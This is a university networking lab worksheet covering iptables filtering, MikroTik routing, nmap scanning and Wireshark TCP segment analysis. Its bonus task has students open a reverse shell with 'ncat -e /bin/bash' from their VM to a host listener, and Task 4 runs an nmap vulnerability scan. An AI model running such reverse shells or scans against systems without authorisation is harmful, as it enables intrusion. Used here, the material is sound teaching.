### Practice 4: Advanced Network Configuration, Traffic Filtering, and Segment Analysis

#### Lesson Goals
Building on the foundational concepts from Practice 3, this session delves deeper into network security through traffic filtering (iptables), advanced router configuration with real-world group collaboration on MikroTik devices, and detailed packet segment analysis for TCP/UDP protocols using Wireshark. The focus is on practical application to simulate real network scenarios, such as interconnecting separate subnets and diagnosing connection issues. Aligned with the flipped lesson format in the syllabus, students will pre-study firewall rules and routing principles (e.g., via short videos or readings on MikroTik wiki and Wireshark TCP analysis). During the session, employ collaborative mind mapping—groups of 2–3 will create and refine a shared mind map linking iptables chains to routing decisions and TCP segment behaviors, drawing from modern methodologies like those described in educational resources on flipped classrooms with mind maps (e.g., reinforcing concepts through interactive group activities for better retention and motivation, as in pilot studies on collaborative strategies). This approach fosters active learning, problem-solving, and teamwork, preparing students for complex network designs in courses like Microservices.

**Note**: You can open this file in VSCode or another editor for better command highlighting.

#### Grading
Tasks 1-4 are graded with 0.5 points each.

You can get up to 1 point for completion of the additional task.

---

#### Warming up
This is a brief task to refresh command-line skills and prepare for advanced network analysis. Use the knowledge base below as a reference and collaborate in groups of 2–3.

**Knowledgebase START**
- `nmap <IP> -p <range>`: Scan ports on a target (e.g., `nmap kse.ua -p 0-1000`).
- `nslookup <domain>`: Resolve domain names to IP addresses.
- `wget <URL>`: Download a file from a URL.
- `socat TCP-LISTEN:<port>,fork`: Create a TCP listener.
- `nc -l <port>`: Listen on a port with netcat.
- Wireshark filters: `tcp` or `udp` for protocol-specific traffic.
**Knowledgebase END**

**Warming Up Tasks**
1. Open PowerShell (Windows) or Terminal (MacOS/Linux) on your host system.
2. Start your VM with `multipass start noble` and log in with `multipass shell noble`.
3. Run `nmap kse.ua -p 0-1000` to scan open ports and note HTTP/HTTPS ports.
4. Use `nslookup kse.ua` to resolve the domain and compare with nmap results.
5. Download a file with `wget kse.ua` and observe the process.
6. Open Wireshark, select the VM interface, and apply a `tcp` filter to monitor traffic.
7. Discuss in your group: How do port scans and DNS resolution aid network troubleshooting? Add initial nodes to your mind map linking these to firewall concepts.

---

#### Task 1 (0.5 points): Simple API Server with Socat
This task builds a basic TCP server to handle commands, extending skills from Practice 3. Work individually, then test in pairs.

**Knowledgebase START**
- `socat TCP-LISTEN:<port>,fork system:<script>`: Run a script via a TCP socket.
- `read LINE`: Read user input into a variable in Bash.
- `ip a`: Display IP and MAC address information.
- `grep` and `cut`: Extract specific data from command output.
**Knowledgebase END**

**Tasks**
1. Log into the VM and navigate to `~/week3` (create it with `mkdir ~/week3` if needed).
2. Create a script `command_server.sh` with `touch command_server.sh` and make it executable with `chmod +x command_server.sh`.
3. Edit `command_server.sh` with `nano` or VSCode to include:
   - Prompt for a command with `read LINE`.
   - Support commands:
     - `"hello"`: Return "Hello! My ip is <IP>. My MAC is <MAC>." using `ip a` with `grep` and `cut`.
     - `"data"`: Read the first line from `data.txt` (create with 10 lines of text) and wait for "next".
     - `"next"`: Read the next line from `data.txt`, exit if no more lines.
     - `"exit"`: Terminate the script.
4. Start the server with `socat TCP-LISTEN:3737,fork system:~/week3/command_server.sh`.
5. From the host, connect with `nc <VM_IP> 3737` and test the commands.
6. Discuss with your partner: How does this simulate a simple network service? Update your mind map with connections to TCP reliability.

---

#### Task 2 (0.5 points): iptables Traffic Filtering
This task introduces firewall rules to control network traffic. Work in groups to design and test rules.

**Knowledgebase START**
- `sudo iptables -A <chain> -p <protocol> -j <action>`: Append a rule (e.g., `-j DROP` or `-j ACCEPT`).
- `sudo iptables -L`: List all rules.
- Chains: INPUT, OUTPUT, FORWARD.
- `--dport <port>`: Filter by destination port.
**Knowledgebase END**

**Tasks**
1. Log into the VM with `multipass shell noble`.
2. Create a simple script (e.g., `echo "Test Server"`) and run it on port 7373 with `socat TCP-LISTEN:7373,fork system:"echo Test Server"`.
3. Verify access from the host with `nc <VM_IP> 7373`.
4. In a new VM shell, block access to port 7373 for all with `sudo iptables -A INPUT -p tcp --dport 7373 -j DROP`.
5. Test connectivity again with `nc <VM_IP> 7373` and confirm it fails.
6. Allow access only from the host IP with `sudo iptables -I INPUT -p tcp --dport 7373 -s <host_IP> -j ACCEPT`.
7. Clear rules with `sudo iptables -F` and retest.
8. Discuss in your group: How do firewalls enhance network security? Add this to your mind map, linking to routing decisions.

---

#### Task 3 (0.5 points): Inter-Group Router Configuration and Routing
This task (40–50 minutes) applies routing knowledge to real MikroTik routers, emphasizing collaborative setup where groups work separately before interconnecting. Work in assigned groups of 2–3 (each group gets a Router N from the list below), coordinating with another group for interconnection.

**Knowledgebase START**
- MikroTik Quick Set: Configure IP, subnet, DHCP, and WiFi.
- `/ip route add`: Add a routing rule in MikroTik Terminal.
- WAN/LAN: Configure network interfaces.
**Knowledgebase END**

**Tasks**
1. Students are split into groups (2 students per router); each gets a Router N.
2. Separately: Connect to your router via WiFi (e.g., MikroTik-N-2ghz at 192.168.88.1), log in (admin, no password), set a password.
3. In Quick Set, configure WiFi network with assigned subnet (e.g., 10.0.N.0/24 for Router N), router IP as smallest valid (e.g., 10.0.N.1), rename WiFi to "Router N", enable DHCP/NAT, and apply configuration after teacher check.
4. Connect to the new WiFi, log in with new IP, note ether1 IP (starts with 192.168.1.).
5. Coordinate with paired group (teacher assigns, e.g., Router N with Router M): Exchange ether1 IPs and subnet details.
6. Separately add route: In Advanced tab (IP => Routes), add rule for traffic to 10.0.M.0/24 via paired group's 192.168.1.x IP.
**NOTE:** In this case both routers belong to 192.168.1.0/24 network and can communicate with each other. But their WiFi networks are isolated so if any device from 10.0.N.0/24 network wants to access some device form 10.0.M.0/24 network, the only way to do it is to ask router to find someone who may know about such an IP address.
7. Remove WAN traffic limit rule in IP => Firewall as it drops any WAN related traffic.
8. Test interconnection: Ping 10.0.M.1 from your router's Terminal; if successful, try pinging devices in the other network (if you encounter Windows firewall issues, you may connect your phone to that wifi and ping it instead).
9. Reset router configuration.
10. Discuss in your group: How does separate configuration and routing interconnection simulate real-world network expansion? Update mind map with branching for multi-group collaboration.

---

#### Task 4 (0.5 points): Network Scanning and Packet Drops
This task uses nmap and Wireshark for network exploration with simulated issues. Work in pairs.

**Knowledgebase START**
- `nmap --script vuln <target>`: Scan for vulnerabilities.
- `nc <IP> <port>`: Connect to a port and send commands.
- Wireshark: Use `tcp.stream eq <number>` for stream analysis.
**Knowledgebase END**

**Tasks**
1. In the VM, run `nmap --script vuln kse.ua -v` to scan for vulnerabilities and note open ports.
2. Use `nc kse.ua <port>` (e.g., 80) to connect, send `GET index.html`, and observe the response.
3. Start a TCP server in the VM with `socat TCP-LISTEN:2024,fork` and connect from the host with `nc <VM_IP> 2024`.
4. In Wireshark, monitor traffic with `tcp.port==2024`, select a stream, and analyze sequence/ACK numbers.
5. Add an iptables rule to drop 50% of TCP packets: `sudo iptables -I INPUT -p tcp --dport 2024 -m statistic --mode random --probability 0.5 -j DROP`.
6. Observe red segments (retransmissions) in Wireshark and adjust probability (e.g., 0.3), then delete with `sudo iptables -D INPUT 1`.
7. Discuss with your partner: How do packet drops affect TCP reliability? Link this in your mind map to segment flags.

---

#### Additional Task(1 point): Detailed TCP Segment Analysis with Reverse Shell
This task focuses on in-depth Wireshark analysis of TCP segments in a practical scenario. Work individually, then compare findings in groups.

**Knowledgebase START**
- `ncat -lnvp <port>`: Listen for connections.
- `ncat -e /bin/bash <IP> <port>`: Create a reverse shell.
- Wireshark: Analyze flags (SYN, ACK, FIN, RST), sequence/ACK numbers, retransmissions, and stream graphs (Statistics => TCP Stream Graphs).
**Knowledgebase END**

**Tasks**
1. On the host (or helper VM), listen on port 1715: `ncat -lnvp 1715`.
2. In the VM, create files: `mkdir ~/test7_1; cd ~/test7_1; touch test.txt; echo "Jump" > bingo.txt; mkdir new; echo "Run" > new/1.txt`.
3. From VM, connect reverse shell: `ncat -e /bin/bash <host_IP> 1715`.
4. In host shell, execute commands like `ls`, `pwd`, `grep Jump *`, `find -name bingo.txt` and observe VM responses.
5. In Wireshark (filter `tcp.port==1715`), capture and analyze:
   - Handshake: SYN, SYN/ACK, ACK packets with sequence/ACK numbers.
   - Data segments: Flags, sequence/ACK for command execution and responses.`
   - Closure: FIN/ACK exchange when closing (Ctrl+C).
   - Use TCP Stream Graphs for time-sequence visualization.
6. Discuss in your group: How do TCP flags and numbers ensure ordered delivery in scenarios like reverse shells? Refine your mind map with detailed branches for segment analysis.


#### Notes
- Use Multipass VMs for Tasks 1, 2, 4, and 5.
- Coordinate with the teacher for MikroTik access and group pairing in Task 3.
- Ensure nmap, ncat, and Wireshark are installed; install ncat in VM with `sudo apt install ncat` if needed.